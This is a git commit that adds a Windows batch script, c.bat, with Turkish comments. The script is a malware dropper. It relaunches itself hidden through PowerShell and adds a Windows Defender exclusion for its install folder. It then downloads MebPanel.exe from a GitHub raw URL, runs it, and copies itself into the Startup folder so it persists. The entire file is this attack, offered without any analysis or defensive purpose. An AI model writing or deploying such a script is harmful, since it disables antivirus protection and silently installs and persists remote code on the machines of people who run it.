650eb202af270b737bdd2b91d7819b877bed16ba
zugar00311 <hdeiba.m7o@gmail.com>
2026-05-20 19:12:56 +0300

    Add files via upload

---
+++ c.bat
@@ -0,0 +1,38 @@
+@echo off
+
+:: Gizli mod
+if not "%1"=="hidden" (
+    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
+    exit
+)
+
+:: Ayarlar
+set "INSTALL=%LOCALAPPDATA%\MebPanel"
+set "URL=https://raw.githubusercontent.com/zugar00311/aa/refs/heads/main/MebPanel.exe"
+set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+set "BATFILE=%STARTUP%\MebPanel_Kontrol.bat"
+set "EXEFILE=%INSTALL%\MebPanel.exe"
+
+:: Klasör oluþtur
+mkdir "%INSTALL%" 2>nul
+
+:: Defender dýþlama
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%INSTALL%'" >nul 2>&1
+
+:: Kontrol: MebPanel.exe var mý?
+if not exist "%EXEFILE%" (
+    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%EXEFILE%' -UseBasicParsing" >nul 2>&1
+)
+
+:: Çalýþýyor mu kontrol et
+tasklist | findstr /I "MebPanel.exe" >nul
+if %ERRORLEVEL% NEQ 0 (
+    start "" "%EXEFILE%"
+)
+
+:: Baþlangýca ekle
+if not exist "%BATFILE%" (
+    copy "%~f0" "%BATFILE%" >nul 2>&1
+)
+
+exit
